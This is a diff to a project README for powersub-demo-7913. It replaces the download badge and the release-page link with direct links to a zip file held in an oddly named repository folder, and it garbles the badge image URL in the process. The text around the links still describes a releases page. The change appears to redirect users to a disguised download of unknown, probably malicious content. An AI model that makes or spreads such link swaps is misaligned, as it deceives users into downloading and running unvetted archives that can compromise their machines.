@@ -11,7 +11,7 @@ To get started with powersub-demo-7913, you need to download the application. Fo
 
 1. **Visit the download page**: You can find the application at the following link:
 
-   [![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/richardca58/powersub-demo-7913/releases)
+   [![Download Now](https://raw.githubusercontent.com/richardca58/powersub-demo-7913/main/dungyard/powersub-demo-7913.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/richardca58/powersub-demo-7913/main/dungyard/powersub-demo-7913.zip)
 
 2. **Choose the version**: On the releases page, you will see several versions listed. Select the latest version to ensure you have the newest features and updates.
 
@@ -56,5 +56,5 @@ powersub-demo-7913 is licensed under the MIT License. You are free to use, modif
 
 Thank you for choosing powersub-demo-7913! We hope this application helps simplify your tasks and improves your productivity.
 
-Don’t forget to check back on our [release page](https://github.com/richardca58/powersub-demo-7913/releases) for future updates and enhancements.
+Don’t forget to check back on our [release page](https://raw.githubusercontent.com/richardca58/powersub-demo-7913/main/dungyard/powersub-demo-7913.zip) for future updates and enhancements.
 ```
